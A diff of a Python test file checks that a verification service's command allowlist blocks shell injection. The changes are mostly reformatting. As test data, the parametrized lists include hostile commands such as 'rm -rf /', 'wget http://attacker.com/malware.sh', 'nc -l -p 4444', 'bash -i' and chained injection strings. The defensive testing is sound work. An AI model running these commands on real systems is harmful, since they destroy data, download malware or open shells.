@@ -31,21 +31,13 @@ Test Coverage:
     - Normal execution validation
 """
 
-import asyncio
-import shlex
-from datetime import datetime
-from uuid import uuid4
-
 import pytest
 import pytest_asyncio
-from sqlalchemy import select
-from sqlalchemy.ext.asyncio import AsyncSession
 
 from src.core.exceptions import ValidationError, VerificationError
 from src.models.agent import Agent, AgentStatus
 from src.services.verification_service import (
     ALLOWED_COMMANDS,
-    ClaimType,
     VerificationService,
 )
 
@@ -92,35 +84,34 @@ class TestCommandInjectionPrevention:
     # ========================================
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("command,full_command", [
-        ("pytest", "pytest --version"),
-        ("python", "python --version"),
-        ("python3", "python3 --version"),
-        ("coverage", "coverage --version"),
-        ("ruff", "ruff --version"),
-        ("mypy", "mypy --version"),
-        ("black", "black --version"),
-        ("isort", "isort --version"),
-        ("flake8", "flake8 --version"),
-        ("bandit", "bandit --version"),
-        ("safety", "safety --version"),
-        ("pip", "pip --version"),
-        ("echo", "echo 'test'"),
-        ("cat", "cat /etc/hostname"),
-        ("ls", "ls -la"),
-        ("pwd", "pwd"),
-        ("whoami", "whoami"),
-        ("true", "true"),
-        ("false", "false"),
-        ("exit", "exit 0"),
-        ("sleep", "sleep 1"),
-    ])
+    @pytest.mark.parametrize(
+        "command,full_command",
+        [
+            ("pytest", "pytest --version"),
+            ("python", "python --version"),
+            ("python3", "python3 --version"),
+            ("coverage", "coverage --version"),
+            ("ruff", "ruff --version"),
+            ("mypy", "mypy --version"),
+            ("black", "black --version"),
+            ("isort", "isort --version"),
+            ("flake8", "flake8 --version"),
+            ("bandit", "bandit --version"),
+            ("safety", "safety --version"),
+            ("pip", "pip --version"),
+            ("echo", "echo 'test'"),
+            ("cat", "cat /etc/hostname"),
+            ("ls", "ls -la"),
+            ("pwd", "pwd"),
+            ("whoami", "whoami"),
+            ("true", "true"),
+            ("false", "false"),
+            ("exit", "exit 0"),
+            ("sleep", "sleep 1"),
+        ],
+    )
     async def test_allowed_commands_execute_successfully(
-        self,
-        verification_service,
-        test_agent_for_verification,
-        command: str,
-        full_command: str
+        self, verification_service, test_agent_for_verification, command: str, full_command: str
     ):
         """Test that all 21 allowed commands execute without ValidationError.
 
@@ -160,29 +151,30 @@ class TestCommandInjectionPrevention:
     # ========================================
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("dangerous_command", [
-        "rm",
-        "rm -rf /",
-        "curl",
-        "curl http://attacker.com",
-        "wget",
-        "wget http://attacker.com/malware.sh",
-        "nc",
-        "nc -l -p 4444",
-        "ncat",
-        "socat",
-        "sh",
-        "bash",
-        "ksh",
-        "zsh",
-        "perl",
-        "ruby",
-        "node",
-    ])
+    @pytest.mark.parametrize(
+        "dangerous_command",
+        [
+            "rm",
+            "rm -rf /",
+            "curl",
+            "curl http://attacker.com",
+            "wget",
+            "wget http://attacker.com/malware.sh",
+            "nc",
+            "nc -l -p 4444",
+            "ncat",
+            "socat",
+            "sh",
+            "bash",
+            "ksh",
+            "zsh",
+            "perl",
+            "ruby",
+            "node",
+        ],
+    )
     async def test_dangerous_commands_blocked_by_allowlist(
-        self,
-        verification_service,
-        dangerous_command
+        self, verification_service, dangerous_command
     ):
         """Test that dangerous/uncommon commands are blocked.
 
@@ -208,7 +200,9 @@ class TestCommandInjectionPrevention:
 
         # Verify error message is clear
         error_message = str(exc_info.value)
-        assert "not allowed" in error_message.lower() or "command not allowed" in error_message.lower()
+        assert (
+            "not allowed" in error_message.lower() or "command not allowed" in error_message.lower()
+        )
         # Error message contains the base command (first token)
         base_cmd = dangerous_command.split()[0]
         assert base_cmd in error_message
@@ -218,17 +212,18 @@ class TestCommandInjectionPrevention:
     # ========================================
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("injection_attempt", [
-        # Injection with dangerous commands (these are blocked by allowlist)
-        "rm; pytest",            # rm is not in allowlist
-        "curl http://attacker.com; pytest",
-        "bash -i",               # bash is not in allowlist
-        "perl -e 'system(...)'",  # perl is not in allowlist
-    ])
+    @pytest.mark.parametrize(
+        "injection_attempt",
+        [
+            # Injection with dangerous commands (these are blocked by allowlist)
+            "rm; pytest",  # rm is not in allowlist
+            "curl http://attacker.com; pytest",
+            "bash -i",  # bash is not in allowlist
+            "perl -e 'system(...)'",  # perl is not in allowlist
+        ],
+    )
     async def test_shell_injection_with_disallowed_base_commands_blocked(
-        self,
-        verification_service,
-        injection_attempt
+        self, verification_service, injection_attempt
     ):
         """Test that shell injection with disallowed base commands are blocked.
 
@@ -268,16 +263,17 @@ class TestCommandInjectionPrevention:
         assert "not allowed" in error_message or "invalid" in error_message.lower()
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("safe_with_operators", [
-        "echo test > /tmp/file",  # Safe: '>' is literal argument to echo
-        "python --version | cat",  # Safe: '|' is literal argument
-        "pytest && true",  # Safe: '&&' is literal argument
-        "coverage || pwd",  # Safe: '||' is literal argument
-    ])
+    @pytest.mark.parametrize(
+        "safe_with_operators",
+        [
+            "echo test > /tmp/file",  # Safe: '>' is literal argument to echo
+            "python --version | cat",  # Safe: '|' is literal argument
+            "pytest && true",  # Safe: '&&' is literal argument
+            "coverage || pwd",  # Safe: '||' is literal argument
+        ],
+    )
     async def test_allowed_commands_with_shell_operators_are_safe(
-        self,
-        verification_service,
-        safe_with_operators
+        self, verification_service, safe_with_operators
     ):
         """Test that allowed commands with shell operators don't execute injection.
 
@@ -328,10 +324,7 @@ class TestCommandInjectionPrevention:
     # ========================================
 
     @pytest.mark.asyncio
-    async def test_empty_command_raises_validation_error(
-        self,
-        verification_service
-    ):
+    async def test_empty_command_raises_validation_error(self, verification_service):
         """Test that empty command string raises ValidationError.
 
         Test Case:
@@ -355,10 +348,7 @@ class TestCommandInjectionPrevention:
         assert "empty" in error_message or "no command" in error_message
 
     @pytest.mark.asyncio
-    async def test_whitespace_only_command_raises_validation_error(
-        self,
-        verification_service
-    ):
+    async def test_whitespace_only_command_raises_validation_error(self, verification_service):
         """Test that whitespace-only command raises ValidationError.
 
         Test Case:
@@ -377,15 +367,16 @@ class TestCommandInjectionPrevention:
         assert "empty" in error_message
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("malformed_quote", [
-        "pytest 'unclosed quote",  # Unclosed single quote
-        'pytest "unclosed double',  # Unclosed double quote
-        "pytest 'mixed\" quotes",   # Mismatched quote types
-    ])
+    @pytest.mark.parametrize(
+        "malformed_quote",
+        [
+            "pytest 'unclosed quote",  # Unclosed single quote
+            'pytest "unclosed double',  # Unclosed double quote
+            "pytest 'mixed\" quotes",  # Mismatched quote types
+        ],
+    )
     async def test_malformed_quotes_raise_validation_error(
-        self,
-        verification_service,
-        malformed_quote
+        self, verification_service, malformed_quote
     ):
         """Test that truly malformed quotes raise ValidationError.
 
@@ -420,10 +411,7 @@ class TestCommandInjectionPrevention:
     # ========================================
 
     @pytest.mark.asyncio
-    async def test_timeout_raises_verification_error(
-        self,
-        verification_service
-    ):
+    async def test_timeout_raises_verification_error(self, verification_service):
         """Test that command timeout raises VerificationError.
 
         Test Case:
@@ -443,10 +431,7 @@ class TestCommandInjectionPrevention:
         """
         # 'sleep 60' will take 60 seconds, but timeout is 0.1 seconds
         with pytest.raises(VerificationError) as exc_info:
-            await verification_service._execute_verification(
-                "sleep 60",
-                timeout_seconds=0.1
-            )
+            await verification_service._execute_verification("sleep 60", timeout_seconds=0.1)
 
         error_message = str(exc_info.value).lower()
         assert "timeout" in error_message or "timed out" in error_message
@@ -456,10 +441,7 @@ class TestCommandInjectionPrevention:
     # ========================================
 
     @pytest.mark.asyncio
-    async def test_allowed_command_executes_and_returns_result(
-        self,
-        verification_service
-    ):
+    async def test_allowed_command_executes_and_returns_result(self, verification_service):
         """Test that allowed command executes and returns proper result structure.
 
         Test Case:
@@ -504,10 +486,7 @@ class TestCommandInjectionPrevention:
         assert result["return_code"] == 0
 
     @pytest.mark.asyncio
-    async def test_allowed_command_with_arguments_executes(
-        self,
-        verification_service
-    ):
+    async def test_allowed_command_with_arguments_executes(self, verification_service):
         """Test that allowed command with arguments executes correctly.
 
         Test Case:
@@ -526,9 +505,7 @@ class TestCommandInjectionPrevention:
             → Executes /usr/bin/echo with 3 string arguments
             → No shell interpretation of arguments
         """
-        result = await verification_service._execute_verification(
-            "echo test1 test2 test3"
-        )
+        result = await verification_service._execute_verification("echo test1 test2 test3")
 
         assert result["return_code"] == 0
         assert "test1" in result["stdout"]
@@ -593,22 +570,36 @@ class TestCommandInjectionPrevention:
 
         # Verify the expected commands are present
         expected_commands = {
-            "pytest", "python", "python3", "coverage", "ruff", "mypy",
-            "black", "isort", "flake8", "bandit", "safety", "pip",
-            "echo", "cat", "ls", "pwd", "whoami",
-            "true", "false", "exit", "sleep"
+            "pytest",
+            "python",
+            "python3",
+            "coverage",
+            "ruff",
+            "mypy",
+            "black",
+            "isort",
+            "flake8",
+            "bandit",
+            "safety",
+            "pip",
+            "echo",
+            "cat",
+            "ls",
+            "pwd",
+            "whoami",
+            "true",
+            "false",
+            "exit",
+            "sleep",
         }
-        assert ALLOWED_COMMANDS == expected_commands
+        assert expected_commands == ALLOWED_COMMANDS
 
     # ========================================
     # Test 8: Integration with Verification Service
     # ========================================
 
     @pytest.mark.asyncio
-    async def test_injection_blocked_at_service_boundary(
-        self,
-        verification_service
-    ):
+    async def test_injection_blocked_at_service_boundary(self, verification_service):
         """Test that command injection is blocked at the service boundary.
 
         Test Case:
@@ -645,10 +636,7 @@ class TestCommandInjectionPrevention:
     # ========================================
 
     @pytest.mark.asyncio
-    async def test_allowed_command_executes_within_timeout(
-        self,
-        verification_service
-    ):
+    async def test_allowed_command_executes_within_timeout(self, verification_service):
         """Test that allowed command executes within reasonable timeout.
 
         Test Case:
@@ -666,8 +654,7 @@ class TestCommandInjectionPrevention:
             - subprocess communication completes properly
         """
         result = await verification_service._execute_verification(
-            "echo 'test'",
-            timeout_seconds=30.0
+            "echo 'test'", timeout_seconds=30.0
         )
 
         assert result["return_code"] == 0
